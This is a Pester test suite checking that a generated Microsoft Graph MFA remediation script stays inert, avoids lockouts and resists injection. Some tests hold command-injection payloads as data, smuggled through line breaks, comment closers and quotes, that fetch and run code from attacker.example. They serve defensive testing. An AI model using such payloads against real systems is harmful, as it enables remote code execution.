#Requires -Version 7.4
#Requires -Modules Pester

# Covers the generated remediation script.
#
# This is the only part of the toolkit that emits commands which change a tenant, and it
# emits them as text for a person to read. The invariants below are what keep that true,
# and they are worth more than the commands themselves:
#
#   * nothing executes at generation time -- the assessment stays read-only
#   * the generated file refuses to run as written
#   * the destructive line is commented out, and is the LAST step in its block
#   * registering a replacement always appears before removing the phone
#
# That last one is the whole reason the file exists in this shape. Removing somebody's
# phone method before a replacement is confirmed working is the lockout this entire tool
# was built to prevent, and a script that made it a one-liner would be a net loss.

BeforeAll {
    . (Join-Path $PSScriptRoot 'TestHelpers.ps1')
    . (Import-ScriptFunction -Path (Get-AssessmentScriptPath) -Name @(
            'Get-PropertyValue'
            'New-RemediationScript'
            'Write-ProtectedFile'
        ))

    $script:SignInAgeNever = '(none recorded)'
    $script:StaleSignInDays = 90

    function New-Row {
        param(
            [string]$Risk = 'High',
            [string]$Upn = 'someone@fabrikam-example.com',
            [string]$Legacy = 'disabled',
            [string]$Age = '3',
            [string]$Phone = 'mobilePhone'
        )
        [PSCustomObject]@{
            Risk                   = $Risk
            BlockedAtRetirement    = $true
            DisplayName            = 'Test Person'
            UserPrincipalName      = $Upn
            UserId                 = 'u-test'
            IsAdmin                = $false
            PerUserMfaState        = $Legacy
            DaysSinceLastSignIn    = $Age
            PhoneMethodsRegistered = $Phone
        }
    }

    function New-Script {
        param([object[]]$Rows)
        $path = Join-Path ([System.IO.Path]::GetTempPath()) "fix-$(New-Guid).ps1"
        $null = New-RemediationScript -Rows $Rows -Path $path -Customer 'Fabrikam' `
            -GeneratedFrom 'C:\evidence\x.csv' -SkipAclHardening
        return (Get-Content -LiteralPath $path -Raw)
    }
}

Describe 'The generated remediation script' {

    Context 'It cannot run by accident' {

        It 'opens with a throw, so running it unread does nothing' {
            $text = New-Script -Rows @(New-Row)

            $text | Should -Match "throw 'Read this script"
            # Before any command, not buried after them.
            $throwAt = $text.IndexOf('throw ')
            $firstCommand = $text.IndexOf('Invoke-MgGraphRequest')
            $throwAt | Should -BeGreaterThan 0
            $throwAt | Should -BeLessThan $firstCommand
        }

        It 'leaves no Graph call uncommented' {
            # The property that matters most. Every line that would change a tenant has to
            # be inert until a person deliberately uncomments it.
            $text = New-Script -Rows @(New-Row -Legacy 'enforced')

            $live = @($text -split "`r?`n" | Where-Object {
                    $_.Trim() -and -not $_.TrimStart().StartsWith('#')
                })

            foreach ($line in $live) {
                $line | Should -Not -Match 'Invoke-MgGraphRequest'
                $line | Should -Not -Match 'Connect-MgGraph'
            }
        }

        It 'says plainly that it has not been run' {
            $text = New-Script -Rows @(New-Row)
            $text | Should -Match 'THIS FILE HAS NOT BEEN RUN'
        }

        It 'names the write permissions it needs, which the assessment never had' {
            $text = New-Script -Rows @(New-Row)
            $text | Should -Match 'UserAuthenticationMethod\.ReadWrite\.All'
        }
    }

    Context 'Tenant-controlled text cannot become a command' {
        # Display names, UPNs and ids come from the assessed tenant, so anybody who can set
        # a display name there chooses part of this file's text. Past the throw, every line
        # must stay a comment whatever that text holds: a line break smuggled into a value
        # would otherwise start a live statement in a script the operator is told to run
        # with write permissions.

        It 'keeps a display name with a line break inside its comment' {
            $row = New-Row
            $row.DisplayName = "Jane Doe`nIEX (Invoke-RestMethod https://attacker.example/p.ps1)`n#"
            $text = New-Script -Rows @($row)

            $afterThrow = $text.Substring($text.IndexOf('throw '))
            $live = @($afterThrow -split "\r\n|\r|\n" | Select-Object -Skip 1 | Where-Object {
                    $_.Trim() -and -not $_.TrimStart().StartsWith('#')
                })

            $live | Should -BeNullOrEmpty
        }

        It 'keeps every other tenant-sourced value inside its comment too' {
            # Not just the display name: every column the block prints, and the id that is
            # spliced into each commented-out Graph URI, comes from the same tenant.
            $payload = "`r`nIEX (Invoke-RestMethod https://attacker.example/p.ps1)`r`n#"
            $row = [PSCustomObject]@{
                Risk                   = 'High'
                BlockedAtRetirement    = "True$payload"
                DisplayName            = 'Test Person'
                UserPrincipalName      = "someone@fabrikam-example.com$payload"
                UserId                 = "u-test$payload"
                IsAdmin                = $false
                PerUserMfaState        = 'disabled'
                DaysSinceLastSignIn    = "3$payload"
                PhoneMethodsRegistered = "mobilePhone$payload"
            }
            $text = New-Script -Rows @($row)

            $afterThrow = $text.Substring($text.IndexOf('throw '))
            $live = @($afterThrow -split "\r\n|\r|\n" | Select-Object -Skip 1 | Where-Object {
                    $_.Trim() -and -not $_.TrimStart().StartsWith('#')
                })

            $live | Should -BeNullOrEmpty
        }

        It 'keeps a customer label or source path from closing the header comment' {
            # The header is a <# #> block, so "#>" in either value ends it early, with no
            # line break needed. Customer labels come from PSA exports, which are untrusted.
            # Ask PowerShell's own parser what would run: the preamble and the throw, nothing else.
            $path = Join-Path ([System.IO.Path]::GetTempPath()) "fix-$(New-Guid).ps1"
            $null = New-RemediationScript -Rows @(New-Row) -Path $path `
                -Customer 'Fabrikam #> IEX (Invoke-RestMethod https://attacker.example/a.ps1) <#' `
                -GeneratedFrom 'C:\evidence\x.csv #> IEX (Invoke-RestMethod https://attacker.example/b.ps1) <#' `
                -SkipAclHardening

            $tokens = $null; $errors = $null
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($path, [ref]$tokens, [ref]$errors)
            $statements = @($ast.EndBlock.Statements | ForEach-Object { $_.Extent.Text })

            $errors | Should -BeNullOrEmpty
            $statements.Count | Should -Be 3
            $statements[0] | Should -Be 'Set-StrictMode -Version Latest'
            $statements[1] | Should -Be "`$ErrorActionPreference = 'Stop'"
            $statements[2] | Should -BeLike 'throw *'
        }

        It 'keeps a user id inside its quotes once the operator uncomments a Graph line' {
            # Uncommenting is the documented workflow, so the commented-out lines have to be
            # safe as live code too. PowerShell treats curly quotes as single quotes, so a
            # quote of either kind in the id would end the URI string and run what follows.
            foreach ($quote in @("'", [char]0x2019)) {
                $row = New-Row
                $row.UserId = "u-test$quote; IEX (Invoke-RestMethod https://attacker.example/c.ps1); $quote"
                $text = New-Script -Rows @($row)

                $graphLines = @($text -split "\r\n|\r|\n" |
                        Where-Object { $_ -like '# Invoke-MgGraphRequest*' } |
                        ForEach-Object { $_.Substring(2) })
                $graphLines.Count | Should -BeGreaterThan 0

                foreach ($line in $graphLines) {
                    $tokens = $null; $errors = $null
                    $ast = [System.Management.Automation.Language.Parser]::ParseInput($line, [ref]$tokens, [ref]$errors)
                    $commands = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] }, $true) |
                            ForEach-Object { $_.GetCommandName() })

                    $commands | Should -Be @('Invoke-MgGraphRequest') -Because "uncommenting '$line' must run only the Graph call"
                }
            }
        }
    }

    Context 'The order that prevents a lockout' {

        It 'puts the phone removal last, after registering and verifying' {
            $text = New-Script -Rows @(New-Row)

            $tap = $text.IndexOf('temporaryAccessPassMethods')
            $verify = $text.IndexOf('/authentication/methods')
            $delete = $text.IndexOf('-Method DELETE')

            $tap | Should -BeGreaterThan 0
            $verify | Should -BeGreaterThan $tap -Because 'you confirm the replacement after issuing the pass'
            $delete | Should -BeGreaterThan $verify -Because 'removing the phone before verifying is the lockout'
        }

        It 'issues a Temporary Access Pass, which is what makes registration possible at all' {
            # Without it, somebody whose only method is the phone you are removing cannot
            # authenticate well enough to register the replacement.
            $text = New-Script -Rows @(New-Row)
            $text | Should -Match 'temporaryAccessPassMethods'
            $text | Should -Match 'register without the phone'
        }

        It 'marks the user registration as a human step rather than pretending to automate it' {
            $text = New-Script -Rows @(New-Row)
            $text | Should -Match 'Human step'
        }
    }

    Context 'What it says about each user' {

        It 'flags a dormant account as a deprovisioning ticket instead' {
            $stale = New-Script -Rows @(New-Row -Age '400')
            $stale | Should -Match 'STALE'
            $stale | Should -Match 'deprovisioning ticket'

            $never = New-Script -Rows @(New-Row -Age '(none recorded)')
            $never | Should -Match 'STALE'

            $active = New-Script -Rows @(New-Row -Age '3')
            $active | Should -Not -Match 'STALE'
        }

        It 'tells you to convert a legacy per-user MFA account first' {
            $legacy = New-Script -Rows @(New-Row -Legacy 'enforced')
            $legacy | Should -Match 'In legacy per-user MFA \(enforced\)'
            $legacy | Should -Match 'perUserMfaState'

            $clean = New-Script -Rows @(New-Row -Legacy 'disabled')
            $clean | Should -Not -Match 'perUserMfaState'
        }
    }

    Context 'Who it covers' {

        It 'covers the actionable bands and leaves the rest alone' {
            $text = New-Script -Rows @(
                New-Row -Risk 'Critical' -Upn 'crit@fabrikam-example.com'
                New-Row -Risk 'High' -Upn 'high@fabrikam-example.com'
                New-Row -Risk 'Moderate' -Upn 'mod@fabrikam-example.com'
                New-Row -Risk 'Low' -Upn 'low@fabrikam-example.com'
                New-Row -Risk 'Informational' -Upn 'info@fabrikam-example.com'
                New-Row -Risk 'Excluded' -Upn 'excluded@fabrikam-example.com'
            )

            foreach ($upn in @('crit', 'high', 'mod')) {
                $text | Should -Match "$upn@fabrikam-example\.com"
            }
            foreach ($upn in @('low', 'info', 'excluded')) {
                $text | Should -Not -Match "$upn@fabrikam-example\.com"
            }
        }

        It 'writes a usable file when nobody needs remediating' {
            $text = New-Script -Rows @(New-Row -Risk 'Low')
            $text | Should -Match 'No user in an actionable band'
        }

        It 'accepts an action-list row, which does not carry every column' {
            # Reachable with either row shape, and under StrictMode a missing property
            # throws. That exact mistake has crashed this script three times.
            $narrow = [PSCustomObject]@{
                Risk = 'High'; BlockedAtRetirement = $true; DisplayName = 'Narrow Row'
                UserPrincipalName = 'narrow@fabrikam-example.com'; UserId = 'u-narrow'
                IsAdmin = $false; PhoneMethodsRegistered = 'mobilePhone'
            }

            { New-Script -Rows @($narrow) } | Should -Not -Throw
        }
    }
}
